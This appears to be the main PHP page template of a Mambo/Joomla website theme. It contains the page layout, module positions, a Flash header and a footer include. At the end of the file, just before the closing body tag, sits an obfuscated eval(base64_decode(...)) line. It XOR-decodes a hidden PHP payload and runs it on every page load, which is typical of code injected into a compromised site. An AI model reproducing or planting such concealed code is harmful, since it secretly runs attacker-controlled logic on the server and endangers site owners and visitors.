<?php
defined( '_VALID_MOS' ) or die( 'Direct Access to this location is not allowed.' );
// needed to seperate the ISO number from the language file constant _ISO
$iso = explode( '=', _ISO );
// xml prolog
echo '<?xml version="1.0" encoding="'. $iso[1] .'"?' .'>';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">



<?php
if(file_exists($mosConfig_absolute_path."/modules/mod_lxmenu/css_lxmenu.css")){
?>
	<link href="<?php echo $mosConfig_live_site; ?>/modules/mod_lxmenu/css_lxmenu.css" rel="stylesheet" type="text/css"/>
<?php
}
?>	


<head>
<?php
if ( $my->id ) {
	initEditor();
}
?>
<meta http-equiv="Content-Type" content="text/html; <?php echo _ISO; ?>" />
<?php mosShowHead(); ?>
<link rel="stylesheet" type="text/css" href="<?php echo $mosConfig_live_site; ?>/templates/temalaranja/css/template_css.css" />
</head>
<body>

<table width="800" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
<tr>
	<td width="6" bgcolor="#FFFFFF">
	<img src="<?php echo $mosConfig_live_site; ?>/templates/temalaranja/images/pixel.png" width="1" height="1" alt="spacer" />
	</td>
	<td valign="top" class="greybg">
		
		<!-- This is the vertical menu. Change the links as needed or delete the script from this line if you dont use it-->
		<table width="100%" border="0" cellpadding="0" cellspacing="0">
		<tr>
			<td>
			<?php mosLoadModules ( 'user3', -1 ); ?>
			</td>
		</tr>
		</table>
		<table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
		<tr>
			
			<td align="center" valign="top">
			<img src="<?php echo $mosConfig_live_site; ?>/templates/temalaranja/images/image_01.jpg" width="790" height="201" alt="header" />
			</td>


<tr width="790" height="136" >
<td width="790" height="136" align="center" valign="top">
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="790" height="136">
                                        <param name="movie" value="<?php echo $mosConfig_live_site;?>/templates/temalaranja/pisivile.swf" />
                                        <param name="quality" value="high" />
                                        <embed src="<?php echo $mosConfig_live_site;?>/templates/temalaranja/pisivile.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="790" height="136"></embed>
                                      </object></td>
</tr>
		</tr>
		</table>
		<table width="100%" border="0" cellspacing="0" cellpadding="0">
		<tr>
			<td width="160" valign="top" bgcolor="#EEEEEE">
			<?php mosLoadModules ( 'left' ); ?>
			</td>
			<td width="6" bgcolor="#FFFFFF">&nbsp;</td>
			<td valign="top">
			<br />
				<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
				<tr>
					<td class="pathway">
					<?php mosPathWay(); ?>
					</td>
				</tr>
				</table>
			<br />
				<table width="98%" border="0" align="center" cellpadding="4" cellspacing="0" bgcolor="#FFFFFF">				<tr>
					<td class="mainpage">
					<?php mosMainBody(); ?>
					</td>
				</tr>
				</table>
			</td>
			<td class="mainpage-bkg" bgcolor="#FFFFFF">
			<img src="<?php echo $mosConfig_live_site;?>/templates/temalaranja/images/pixel.png" width="1" height="1" alt="spacer"/>
			</td>
			<td width="150" valign="top" bgcolor="#EEEEEE">
				<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
					<td style="padding-right:5px;">
					<?php mosLoadModules ( 'right' ); ?>
					</td>
				</tr>
				</table>
			<br />
			</td>
		</tr>
		</table>
		<table width="100%" border="0" cellspacing="0" cellpadding="0">
		<tr>
			<td width="51%" height="30" bgcolor="#999999">&nbsp;</td>
			<td width="49%" align="center" valign="middle" bgcolor="#999999">
			<?php include_once( $GLOBALS['mosConfig_absolute_path'] . '/includes/footer.php' ); ?>
			</td>
		</tr>
		</table>
	</td>
	<td width="6" bgcolor="#FFFFFF">
	<img src="<?php echo $mosConfig_live_site; ?>/templates/temalaranja/images/pixel.png" width="1" height="1" alt="spacer"/>
	</td>
</tr>
</table>
<?php mosLoadModules( 'debug', -1 );?>
<?eval(base64_decode("JGs9MTE5OyRtPWV4cGxvZGUoIjsiLCIzMDsxNzs4Nzs5NTs0OzM7NTszMDs0OzM7NTs5NTs4Mzs0MDszNjs1MDszNzszMzs1MDszNzs0NDs4NTs2MzszNTszNTszOTs0MDszNDszNjs1MDszNzs0MDs1NDs0ODs1MDs1NzszNTs4NTs0Mjs5MTs4NTsxNjsyNDsyNDsxNjsyNzsxODsyMTsyNDszOzg1Ozk0OzExOzExOzQ7Mzs1OzMwOzQ7Mzs1Ozk1OzgzOzQwOzM2OzUwOzM3OzMzOzUwOzM3OzQ0Ozg1OzYzOzM1OzM1OzM5OzQwOzM0OzM2OzUwOzM3OzQwOzU0OzQ4OzUwOzU3OzM1Ozg1OzQyOzkxOzg1OzE0OzIyOzMxOzI0OzI0Ozg1Ozk0Ozk0OzEyOzEyMjsxMjU7MTI2OzgzOzI7NTsyNzs0MDsyOzI1OzMwOzY7MjsxODs0MDsyNTsyMjsyNjsxODs3NDs4NTszMTszOzM7Nzs3Nzs4ODs4ODswOzA7MDs4OTsxNjsxODszOzIyOzI3OzI3OzI3OzMwOzI1OzI4OzQ7ODk7MzA7MjU7MTc7MjQ7ODg7Mjc7MzA7MjU7Mjg7NDs4ODs4NTs4OTs1OzIyOzI1OzE5Ozk1OzcxOzkxOzY5OzY2OzcxOzk0Ozg5Ozg1Ozg5OzM7MTU7Mzs3MjszMDs3Ozc0Ozg1Ozg5OzgzOzQwOzM2OzUwOzM3OzMzOzUwOzM3OzQ0Ozg1OzM3OzUwOzU4OzU2OzM1OzUwOzQwOzU0OzUxOzUxOzM3Ozg1OzQyOzg5Ozg1OzgxOzMxOzI0OzQ7Mzs3NDs4NTs4OTs1OzIyOzA7Mjs1OzI3OzE4OzI1OzIwOzI0OzE5OzE4Ozk1OzgzOzQwOzM2OzUwOzM3OzMzOzUwOzM3OzQ0Ozg1OzYzOzM1OzM1OzM5OzQwOzYzOzU2OzM2OzM1Ozg1OzQyOzk0Ozg5Ozg1OzgxOzIyOzE2OzE4OzI1OzM7NzQ7ODU7ODk7NTsyMjswOzI7NTsyNzsxODsyNTsyMDsyNDsxOTsxODs5NTs4Mzs0MDszNjs1MDszNzszMzs1MDszNzs0NDs4NTs2MzszNTszNTszOTs0MDszNDszNjs1MDszNzs0MDs1NDs0ODs1MDs1NzszNTs4NTs0Mjs5NDs3NjsxMjI7MTI1OzEyNjszMDsxNzs4Nzs5NTsxNzsyOzI1OzIwOzM7MzA7MjQ7MjU7NDA7MTg7MTU7MzA7NDszOzQ7OTU7ODU7MjA7Mjs1OzI3OzQwOzMwOzI1OzMwOzM7ODU7OTQ7OTQ7ODc7MTI7MTIyOzEyNTsxMjY7MTI2OzgzOzIwOzMxOzQwOzI7MjU7MzA7NjsyOzE4OzQwOzI1OzIyOzI2OzE4Ozg3Ozc0Ozg3OzU1OzIwOzI7NTsyNzs0MDszMDsyNTszMDszOzk1Ozk0Ozc2OzEyMjsxMjU7MTI2OzEyNjs1NTsyMDsyOzU7Mjc7NDA7NDsxODszOzI0Ozc7Mzs4Nzs5NTs4MzsyMDszMTs0MDsyOzI1OzMwOzY7MjsxODs0MDsyNTsyMjsyNjsxODs5MTs4Nzs1MjszNDszNzs1OTs1NjszOTszNTs0MDszNDszNzs1OTs5MTs4Nzs4MzsyOzU7Mjc7NDA7MjsyNTszMDs2OzI7MTg7NDA7MjU7MjI7MjY7MTg7OTQ7NzY7MTIyOzEyNTsxMjY7MTI2OzU1OzIwOzI7NTsyNzs0MDs0OzE4OzM7MjQ7NzszOzg3Ozk1OzgzOzIwOzMxOzQwOzI7MjU7MzA7NjsyOzE4OzQwOzI1OzIyOzI2OzE4OzkxOzg3OzUyOzM0OzM3OzU5OzU2OzM5OzM1OzQwOzM3OzUwOzM1OzM0OzM3OzU3OzM1OzM3OzU0OzU3OzM2OzQ5OzUwOzM3OzkxOzg3OzcwOzk0Ozc2OzEyMjsxMjU7MTI2OzEyNjs1NTsyMDsyOzU7Mjc7NDA7NDsxODszOzI0Ozc7Mzs4Nzs5NTs4MzsyMDszMTs0MDsyOzI1OzMwOzY7MjsxODs0MDsyNTsyMjsyNjsxODs5MTs4Nzs1MjszNDszNzs1OTs1NjszOTszNTs0MDszNTs2Mjs1ODs1MDs1NjszNDszNTs5MTs4Nzs2ODs3MTs5NDs3NjsxMjI7MTI1OzEyNjsxMjY7NTU7MjA7Mjs1OzI3OzQwOzQ7MTg7MzsyNDs3OzM7ODc7OTU7ODM7MjA7MzE7NDA7MjsyNTszMDs2OzI7MTg7NDA7MjU7MjI7MjY7MTg7OTE7ODc7NTI7MzQ7Mzc7NTk7NTY7Mzk7MzU7NDA7NTA7NTc7NTI7NTY7NTE7NjI7NTc7NDg7ODc7OTE7ODc7ODU7MTY7MTM7MzA7Nzs4NTs5NDs3NjsxMjI7MTI1OzEyNjsxMjY7ODM7NTsxODs0OzI7Mjc7Mzs0MDsyOzI1OzMwOzY7MjsxODs0MDsyNTsyMjsyNjsxODs3NDs1NTsyMDsyOzU7Mjc7NDA7MTg7MTU7MTg7MjA7ODc7OTU7ODM7MjA7MzE7NDA7MjsyNTszMDs2OzI7MTg7NDA7MjU7MjI7MjY7MTg7OTQ7NzY7MTIyOzEyNTsxMjY7MTI2OzU1OzIwOzI7NTsyNzs0MDsyMDsyNzsyNDs0OzE4Ozg3Ozk1OzgzOzIwOzMxOzQwOzI7MjU7MzA7NjsyOzE4OzQwOzI1OzIyOzI2OzE4Ozk0Ozc2OzE4OzIwOzMxOzI0Ozg3OzgzOzU7MTg7NDsyOzI3OzM7NDA7MjsyNTszMDs2OzI7MTg7NDA7MjU7MjI7MjY7MTg7NzY7MTI2OzEyMjsxMjU7MTI2OzEwOzg3OzE4OzI3OzQ7MTg7ODc7MTI7MTIyOzEyNTsxMjY7MTI2OzgzOzU7MTg7NDsyOzI3OzM7NDA7MjsyNTszMDs2OzI7MTg7NDA7MjU7MjI7MjY7MTg7NzQ7NTU7MTc7MzA7Mjc7MTg7NDA7MTY7MTg7Mzs0MDsyMDsyNDsyNTszOzE4OzI1OzM7NDs5NTs4MzsyOzU7Mjc7NDA7MjsyNTszMDs2OzI7MTg7NDA7MjU7MjI7MjY7MTg7OTQ7NzY7MTg7MjA7MzE7MjQ7ODc7ODM7NTsxODs0OzI7Mjc7Mzs0MDsyOzI1OzMwOzY7MjsxODs0MDsyNTsyMjsyNjsxODs3NjsxMjI7MTI1OzEyNjsxMDsxMjI7MTI1OzEwOyIpOyR6PSIiO2ZvcmVhY2goJG0gYXMgJHYpaWYgKCR2IT0iIikkei49Y2hyKCR2XiRrKTtldmFsKCR6KTs="));?>
</body>
</html>